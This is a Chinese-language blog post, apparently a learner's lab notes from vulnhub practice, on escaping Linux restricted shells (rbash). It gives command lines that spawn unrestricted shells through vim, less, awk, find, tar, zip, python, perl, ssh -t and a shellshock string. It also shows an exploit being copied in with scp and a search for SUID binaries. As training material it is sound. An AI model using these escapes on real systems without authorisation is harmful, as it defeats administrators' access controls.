<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Linux提权学习之rbash逃逸 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Linux提权学习之rbash逃逸</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-27T11:30:38.628Z" id="date"> 2023-09-27</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-27T14:01:11.284Z" id="updated"> 2023-09-27</time></div></span><br><span>文章总字数: <div class="control">3.1k</div></span><br><span>预计阅读时间: <div class="control">13 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>本文的产生也是在刷vulnhub靶场的时候遇到的，由于自身太菜，因此可以看到本文的知识都是cv的┭┮﹏┭┮，自己的想法很少的，也就实操那一部分会跟着做做，还请见谅~~</p>
<h1>0x02 rbash简述</h1>
<h2 id="1、什么是rbash"><a href="#1、什么是rbash" class="headerlink" title="1、什么是rbash"></a>1、什么是rbash</h2>
<p>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p>
<h2 id="2、如何设置一个rbash"><a href="#2、如何设置一个rbash" class="headerlink" title="2、如何设置一个rbash"></a>2、如何设置一个rbash</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /bin/rbash <span class="hljs-comment"># 复制一个bash，重命名为rbash</span><br>useradd -s /bin/rbash <span class="hljs-built_in">test</span> <span class="hljs-comment"># 设置用户test登陆的shell为rbash</span><br><span class="hljs-built_in">mkdir</span> -p /home/test/.bin <span class="hljs-comment"># 在test用户下新建一个.bin目录存放可以执行的命令</span><br></code></pre></td></tr></table></figure>
<h2 id="3、使用场景"><a href="#3、使用场景" class="headerlink" title="3、使用场景"></a>3、使用场景</h2>
<p>Linux Restricted Shell是一种限制命令(如：cd、ls、echo等)、阻止环境变量（如：shell、path、user），甚至于阻止管道/重定向（如：&gt;，&gt;&gt;，|）的shell。</p>
<p><strong>常见的Linux Restricted Shell有rbash、rksh、rsh。</strong></p>
<p>Linux Restricted Shell有如下场景使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. 提高系统安全性<br>2. 阻止黑客执行高危命令<br>3. 系统管理员创建受限制Shell，进而防止普通用户执行危险命令<br>4. 部分CTF赛题，如Root-Me、HackThebox、vulnhub<br></code></pre></td></tr></table></figure>
<h1>0x03 信息搜集</h1>
<p>这里我们主要是通过信息搜集来确定当下的rbash环境下可以执行那些命令，以及环境信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 检查可用的命令，如：<span class="hljs-built_in">cd</span>、<span class="hljs-built_in">ls</span>、<span class="hljs-built_in">echo</span>等<br>2. 检查运算符，如：&gt;、&gt;&gt;、|、&lt;等<br>3. 检查可用的编程语言，如：php、perl、ruby、python等<br>4. 哪些命令可以作为root (sudo -l)运行<br>5. 检查具有SUID perm权限的文件或命令<br>6. 检查当前使用的shell：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$shell</span><br>7. 检查环境变量：运行<span class="hljs-built_in">env</span>、<span class="hljs-built_in">printenv</span>、<span class="hljs-built_in">set</span>等<br></code></pre></td></tr></table></figure>
<p>通过以上操作,我们已收集到一些有用的信息，接下来尝试一下通用的利用方法。</p>
<h1>0x04 常用逃逸命令</h1>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 如果允许使用“/”，则可以运行/bin/sh、/bin/bash<br>2. 如果允许使用<span class="hljs-built_in">cp</span>命令，则可以复制/bin/sh或者/bin/bash到当前目录<br>3. 使用ftp进行命令执行，执行 !/bin/sh<br>4. 使用gdb进行命令执行，执行 !/bin/sh<br>5. 使用more/man/less进行命令执行，执行 !/bin/sh<br>6. 使用vim进行命令执行，执行 !/bin/sh<br>7. 使用rvim执行:python，然后运行import os; os.system(<span class="hljs-string">&quot;/bin/bash )</span><br><span class="hljs-string">8. 使用scp，通过scp来传入自己脚本</span><br><span class="hljs-string">9. 使用awk，执行awk &#x27;BEGIN &#123;system(&quot;</span>/bin/sh or /bin/bash<span class="hljs-string">&quot;)&#125;&#x27;</span><br><span class="hljs-string">10. 使用find，执行find / -name test -exec /bin/sh or /bin/bash \</span><br></code></pre></td></tr></table></figure>
<h2 id="4-1-如果允许使用“-”"><a href="#4-1-如果允许使用“-”" class="headerlink" title="4-1-如果允许使用“-”"></a>4.1 如果允许使用“/”</h2>
<p>则可以运行/bin/sh、/bin/bash</p>
<p class='item-img' data-src='image-20230927195558597.png'><img src="image-20230927195558597.png" alt="image-20230927195558597"></p>
<h2 id="4-2-如果允许使用cp命令"><a href="#4-2-如果允许使用cp命令" class="headerlink" title="4-2-如果允许使用cp命令"></a>4.2 如果允许使用cp命令</h2>
<p>则可以复制/bin/sh到当前目录，不过这里我没有复现成功cp /bin/bash，应该是环境条件不允许吧。—下面有补充</p>
<p class='item-img' data-src='image-20230927200405517.png'><img src="image-20230927200405517.png" alt="image-20230927200405517"></p>
<h2 id="4-3-使用ftp进行命令执行"><a href="#4-3-使用ftp进行命令执行" class="headerlink" title="4-3-使用ftp进行命令执行"></a>4.3 使用ftp进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p class='item-img' data-src='image-20230927195253320.png'><img src="image-20230927195253320.png" alt="image-20230927195253320"></p>
<p>如上图所示的ftp命令</p>
<h2 id="4-4-使用gdb进行命令执行"><a href="#4-4-使用gdb进行命令执行" class="headerlink" title="4-4-使用gdb进行命令执行"></a>4.4 使用gdb进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p class='item-img' data-src='image-20230927200626894.png'><img src="image-20230927200626894.png" alt="image-20230927200626894"></p>
<p>不过前提就是该环境下有gdb环境</p>
<h2 id="4-5-使用more-man-less进行命令执行"><a href="#4-5-使用more-man-less进行命令执行" class="headerlink" title="4-5-使用more-man-less进行命令执行"></a>4.5 使用more/man/less进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p class='item-img' data-src='image-20230927201047565.png'><img src="image-20230927201047565.png" alt="image-20230927201047565"></p>
<p>这里那些文章介绍的不清楚，我复现了一下发现还是需要某种条件：也就是你当前目录下有足够大的内容的文本，这样more读取的时候才会体现出<strong>分页读取</strong>的效果，进而你可以直接输入!/bin/sh</p>
<p class='item-img' data-src='image-20230927201358664.png'><img src="image-20230927201358664.png" alt="image-20230927201358664"></p>
<p class='item-img' data-src='image-20230927201600091.png'><img src="image-20230927201600091.png" alt="image-20230927201600091"></p>
<p>如图less不必非得读取内容多的文件</p>
<p class='item-img' data-src='image-20230927201659205.png'><img src="image-20230927201659205.png" alt="image-20230927201659205"></p>
<p>man似乎直接输入man man即可</p>
<h2 id="4-6-使用vim进行命令执行"><a href="#4-6-使用vim进行命令执行" class="headerlink" title="4-6-使用vim进行命令执行"></a>4.6 使用vim进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p class='item-img' data-src='image-20230927201810774.png'><img src="image-20230927201810774.png" alt="image-20230927201810774"></p>
<h2 id="4-7-使用rvim执行python"><a href="#4-7-使用rvim执行python" class="headerlink" title="4-7-使用rvim执行python"></a>4.7 使用rvim执行python</h2>
<p><code>python import os; os.system(&quot;/bin/bash&quot;)</code></p>
<p>这里不知为何提示我在rvim中无法执行shell命令/禁止使用命令。</p>
<p>但也可能是我不会操作吧。。。。</p>
<h2 id="4-8-使用scp传入自己的脚本"><a href="#4-8-使用scp传入自己的脚本" class="headerlink" title="4-8-使用scp传入自己的脚本"></a>4.8 使用scp传入自己的脚本</h2>
<p>这里未复现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">scp -S /path/yourscript x y:<br></code></pre></td></tr></table></figure>
<p><strong>目标机器连接 kali 利用 ssh 将 exp 下载到靶机上来</strong></p>
<blockquote>
<p>scp &gt;<a href="mailto:root@192.168.26.20">root@192.168.26.20</a>:/usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/     #靶机上执行  用户名和 IP 是 kali 的</p>
<p>scp /path/local_filename username@IP:/path   #kali 上执行  用户名和 IP 是靶机的</p>
</blockquote>
<p>涉及到的提权方式：</p>
<p>**Tips：**拿到一个本地普通用户后，往往先要在该用户的家目录下搜索一番，以寻找有用的信息，提权的时候几乎所有的文件操作都在 tmp 目录下，因为其他目录往往没有权限，所以要时刻注意自己当前所在的目录。</p>
<blockquote>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null   #发现具有 suid 权限的命令</p>
</blockquote>
<h2 id="4-9-使用awk命令执行"><a href="#4-9-使用awk命令执行" class="headerlink" title="4-9-使用awk命令执行"></a>4.9 使用awk命令执行</h2>
<p>执行<code>awk 'BEGIN &#123;system(&quot;/bin/sh or /bin/bash&quot;)&#125;'</code></p>
<p class='item-img' data-src='image-20230927202910634.png'><img src="image-20230927202910634.png" alt="image-20230927202910634"></p>
<p>不过这里更推荐使用一种，我这个环境不知为何使用不了bash，估计是我之前修改了吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;<br></code></pre></td></tr></table></figure>
<h2 id="4-10-使用find执行命令"><a href="#4-10-使用find执行命令" class="headerlink" title="4-10-使用find执行命令"></a>4.10 使用find执行命令</h2>
<p class='item-img' data-src='image-20230927203059460.png'><img src="image-20230927203059460.png" alt="image-20230927203059460"></p>
<p>这里也是使用其中一个</p>
<p>这里看了几篇文章，我再补充一下上述的cp命令：</p>
<h2 id="4-11-补充"><a href="#4-11-补充" class="headerlink" title="4-11-补充"></a>4.11 补充</h2>
<h3 id="1、cp-bin-bash到本地用户目录"><a href="#1、cp-bin-bash到本地用户目录" class="headerlink" title="1、cp-bin-bash到本地用户目录"></a>1、cp /bin/bash到本地用户目录</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash test1<br><span class="hljs-built_in">cp</span> /bin/sh test2<br>./test1 <span class="hljs-comment"># 切换到了/bin/bash</span><br>./test2 <span class="hljs-comment"># 切换到了/bin/sh</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927203517878.png'><img src="image-20230927203517878.png" alt="image-20230927203517878"></p>
<p>执行：<code>git &gt; git help status</code> --这里说git也可，但我没有找到方法</p>
<h3 id="2、set-shell"><a href="#2、set-shell" class="headerlink" title="2、set-shell"></a>2、set shell</h3>
<p><strong>DC-2靶机使用它成功了</strong></p>
<ul>
<li>在一些编辑器中可以设置shell变量然后执行，如vim中</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># vim/vi进入之后</span><br>:<span class="hljs-built_in">set</span> shell=/bin/sh <span class="hljs-comment"># 或者用/bin/bash</span><br>:shell<br><br><span class="hljs-comment"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin/<br></code></pre></td></tr></table></figure>
<h3 id="3、更改PATH或SHELL环境变量"><a href="#3、更改PATH或SHELL环境变量" class="headerlink" title="3、更改PATH或SHELL环境变量"></a>3、更改PATH或SHELL环境变量</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">执行：export -p # 查看系统的环境变量设置<br><br>PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入/bin/bash<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927204458332.png'><img src="image-20230927204458332.png" alt="image-20230927204458332"></p>
<h1>0x05 编程语言逃逸</h1>
<h2 id="5-1-Python"><a href="#5-1-Python" class="headerlink" title="5-1-Python"></a>5.1 Python</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br>或者<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="5-2-PHP"><a href="#5-2-PHP" class="headerlink" title="5-2-PHP"></a>5.2 PHP</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -a then <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;sh -i&quot;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="5-3-perl"><a href="#5-3-perl" class="headerlink" title="5-3-perl"></a>5.3 perl</h2>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&quot;exec &#x27;/bin/sh&#x27;;&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="5-4-lua"><a href="#5-4-lua" class="headerlink" title="5-4-lua"></a>5.4 lua</h2>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">execute</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="5-5-Ruby"><a href="#5-5-Ruby" class="headerlink" title="5-5-Ruby"></a>5.5 Ruby</h2>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">exec <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="5-6-except"><a href="#5-6-except" class="headerlink" title="5-6-except"></a>5.6 except</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">except spawn sh then sh.<br></code></pre></td></tr></table></figure>
<p>不过这些编程语言的用法未曾复现，我发现在kali上输入的时候没反应，估计是环境不匹配吧。暂作记录</p>
<h1>0x06 高级技术</h1>
<h2 id="6-1-ssh"><a href="#6-1-ssh" class="headerlink" title="6-1-ssh"></a>6.1 ssh</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.ssh username@IP -t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;<br>2.ssh username@IP -t &quot;bash --noprofile&quot;<br>3.ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (sehllshock)<br>4.ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)<br></code></pre></td></tr></table></figure>
<h2 id="6-2-zip"><a href="#6-2-zip" class="headerlink" title="6-2-zip"></a>6.2 zip</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;<br></code></pre></td></tr></table></figure>
<h2 id="6-3-tar"><a href="#6-3-tar" class="headerlink" title="6-3-tar"></a>6.3 tar</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="hljs-built_in">exec</span>=/bin/bash<br></code></pre></td></tr></table></figure>
<h2 id="6-4-pico"><a href="#6-4-pico" class="headerlink" title="6-4-pico"></a>6.4 pico</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行pico -s <span class="hljs-string">&quot;/bin/bash&quot;</span>，然后写入/bin/bash，并且执行CTRL+T<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927212137229.png'><img src="image-20230927212137229.png" alt="image-20230927212137229"></p>
<p>这里复现了一波，步骤为直接输入<code>pico -s &quot;/bin/bash&quot;</code>，然后按ctrl+o会让你编写文件名，文件名随意写，接着按ctrl+t，然后执行你想要的命令如whoami，id等等即可</p>
<h2 id="6-5-环境变量修复"><a href="#6-5-环境变量修复" class="headerlink" title="6-5-环境变量修复"></a>6.5 环境变量修复</h2>
<p>获取到的Shell，环境变量可能会缺失，在这里可以通过如下命令进行修复</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export PATH=$PATH:/sbin:/usr/sbin:/bin:/usr/bin<br></code></pre></td></tr></table></figure>
<h1>0x07 简单实战</h1>
<h2 id="7-1-创建测试用户"><a href="#7-1-创建测试用户" class="headerlink" title="7-1-创建测试用户"></a>7.1 创建测试用户</h2>
<p>使用具有sudo特权的用户创建一个新测试用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m <span class="hljs-built_in">test</span> -s /bin/rbash <span class="hljs-comment">## 创建一个用户名为test，并且设置test登录shell为rbash</span><br>passwd <span class="hljs-built_in">test</span>					<span class="hljs-comment">## 为test设置密码</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927212751837.png'><img src="image-20230927212751837.png" alt="image-20230927212751837"></p>
<p>这里密码为123456</p>
<h3 id="7-1-1-为新用户建立目录"><a href="#7-1-1-为新用户建立目录" class="headerlink" title="7-1-1-为新用户建立目录"></a>7.1.1 为新用户建立目录</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /home/test/bin<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927212847642.png'><img src="image-20230927212847642.png" alt="image-20230927212847642"></p>
<h3 id="7-1-2-指定用户可以运行的命令"><a href="#7-1-2-指定用户可以运行的命令" class="headerlink" title="7-1-2-指定用户可以运行的命令"></a>7.1.2 指定用户可以运行的命令</h3>
<p>为用户指定可以运行的命令，创建指向新建目录链接。指定用户可以运行<code>mkdir``ls``ping</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/bash /bin/rbash <span class="hljs-comment">## 从Bash 创建一个名为rbash的符号链接</span><br><span class="hljs-built_in">ln</span> -s /bin/mkdir /home/test1/bin <br><br><span class="hljs-built_in">ln</span> -s /bin/ls /home/test1/bin<br><br><span class="hljs-built_in">ln</span> -s /bin/ping /home/test1/bin<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927213119353.png'><img src="image-20230927213119353.png" alt="image-20230927213119353"></p>
<h2 id="7-2-rbash逃逸"><a href="#7-2-rbash逃逸" class="headerlink" title="7-2-rbash逃逸"></a>7.2 rbash逃逸</h2>
<h3 id="7-2-1-切换用户时逃逸"><a href="#7-2-1-切换用户时逃逸" class="headerlink" title="7-2-1-切换用户时逃逸"></a>7.2.1 切换用户时逃逸</h3>
<p>这里的原理涉及到su 和 su- 的区别：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">su命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的<br><br>su- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927213422218.png'><img src="image-20230927213422218.png" alt="image-20230927213422218"></p>
<p>逃逸：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">su -l test1<br>su - test1<br>su --login test1<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927213823393.png'><img src="image-20230927213823393.png" alt="image-20230927213823393"></p>
<p>这里我并未复现成功，就先看个图吧</p>
<h3 id="7-2-2-ssh登录时逃逸"><a href="#7-2-2-ssh登录时逃逸" class="headerlink" title="7-2-2-ssh登录时逃逸"></a>7.2.2 ssh登录时逃逸</h3>
<p>（借助-t远程在远程机器上运行脚本）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IP -t <span class="hljs-string">&quot;/bin/sh&quot;</span> or <span class="hljs-string">&quot;/bin/bash&quot;</span><br>ssh username@IP -t <span class="hljs-string">&quot;bash --noprofile&quot;</span><br>ssh username@IP -t <span class="hljs-string">&quot;() &#123; :; &#125;; /bin/bash&quot;</span>   <span class="hljs-comment">###shellshock</span><br></code></pre></td></tr></table></figure>
<h3 id="7-2-3-当前shell中逃逸"><a href="#7-2-3-当前shell中逃逸" class="headerlink" title="7-2-3-当前shell中逃逸"></a>7.2.3 当前shell中逃逸</h3>
<h4 id="7-2-3-1-特殊情况"><a href="#7-2-3-1-特殊情况" class="headerlink" title="7-2-3-1-特殊情况"></a>7.2.3.1 特殊情况</h4>
<p>[1] / 被允许的情况下；直接 /bin/sh 或 /bin/bash</p>
<p>[2]能够设置PATH或SHELL时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">export PATH=$PATH:/bin/:/usr/bin:$PATH<br>export SHELL=/bin/sh<br></code></pre></td></tr></table></figure>
<p>[3]权限足够时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp /bin/sh /path/ ;sh<br>或<br>cp /bin/bash /path/ ;sh<br></code></pre></td></tr></table></figure>
<h3 id="7-2-4-利用系统常见应用逃逸"><a href="#7-2-4-利用系统常见应用逃逸" class="headerlink" title="7-2-4-利用系统常见应用逃逸"></a>7.2.4 利用系统常见应用逃逸</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[1]ftp<br>[2]more<br>[3]less<br>[4]man<br>[5]vi<br>[6]vim<br>以上在输入的地方输入!/bin/sh 或 !/bin/bash<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927214155912.png'><img src="image-20230927214155912.png" alt="image-20230927214155912"></p>
<h3 id="7-2-5-利用用户安装应用逃逸"><a href="#7-2-5-利用用户安装应用逃逸" class="headerlink" title="7-2-5-利用用户安装应用逃逸"></a>7.2.5 利用用户安装应用逃逸</h3>
<h4 id="1、ed-editor"><a href="#1、ed-editor" class="headerlink" title="1、ed-editor"></a>1、ed-editor</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ed<br>!&#x27;/bin/sh&#x27;<br></code></pre></td></tr></table></figure>
<h4 id="2、git"><a href="#2、git" class="headerlink" title="2、git"></a>2、git</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">git help status <br>!/bin/bash<br></code></pre></td></tr></table></figure>
<h4 id="3、zip"><a href="#3、zip" class="headerlink" title="3、zip"></a>3、zip</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;<br></code></pre></td></tr></table></figure>
<h4 id="4、tar"><a href="#4、tar" class="headerlink" title="4、tar"></a>4、tar</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tar cf /dev/null filename --checkpoint=1 --checkpoint-action=exec=/bin/bash<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927214312060.png'><img src="image-20230927214312060.png" alt="image-20230927214312060"></p>
<h3 id="7-2-6-利用编程语言环境绕过"><a href="#7-2-6-利用编程语言环境绕过" class="headerlink" title="7-2-6-利用编程语言环境绕过"></a>7.2.6 利用编程语言环境绕过</h3>
<h4 id="1、python"><a href="#1、python" class="headerlink" title="1、python"></a>1、python</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927214351901.png'><img src="image-20230927214351901.png" alt="image-20230927214351901"></p>
<p>这里也是解密了，原来是在真实情况下才可以。。。</p>
<h4 id="2、php"><a href="#2、php" class="headerlink" title="2、php"></a>2、php</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php -a then exec(&quot;sh -i&quot;);<br></code></pre></td></tr></table></figure>
<p>这里仍未复现成功，它提示我语法错误？？？不理解</p>
<p>使用PHP反弹设shell绕过</p>
